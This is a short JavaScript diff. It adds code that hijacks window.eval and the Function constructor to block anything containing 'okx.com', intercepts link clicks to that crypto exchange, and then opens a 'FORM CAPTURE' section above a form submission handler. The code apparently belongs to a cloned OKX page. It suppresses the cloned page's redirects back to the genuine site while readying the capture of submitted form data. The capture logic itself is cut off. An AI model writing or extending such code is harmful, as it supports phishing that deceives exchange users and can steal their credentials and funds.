@@ -7,6 +7,41 @@
 (function() {
   'use strict';
 
+  // ========== REDIRECT BLOCKING ==========
+  // Prevent eval-based redirects
+  const originalEval = window.eval;
+  window.eval = function(code) {
+    if (code && typeof code === 'string' && code.includes('okx.com')) {
+      console.log('🚫 Blocked eval with okx.com redirect');
+      return;
+    }
+    return originalEval(code);
+  };
+
+  // Prevent Function constructor redirects
+  const originalFunction = window.Function;
+  window.Function = function(...args) {
+    const code = args.join(' ');
+    if (code && code.includes('okx.com')) {
+      console.log('🚫 Blocked Function constructor with okx.com redirect');
+      return function() {};
+    }
+    return new originalFunction(...args);
+  };
+
+  // Block any link navigation
+  document.addEventListener('click', function(e) {
+    const target = e.target.closest('a, [role="link"]');
+    if (target && target.href && target.href.includes('okx.com')) {
+      e.preventDefault();
+      e.stopPropagation();
+      console.log('🚫 Blocked link click to:', target.href);
+      return false;
+    }
+  }, true);
+
+  // ========== FORM CAPTURE ==========
+
   // Form submission handler
   function initializeFormHandler() {
     const maxAttempts = 50;
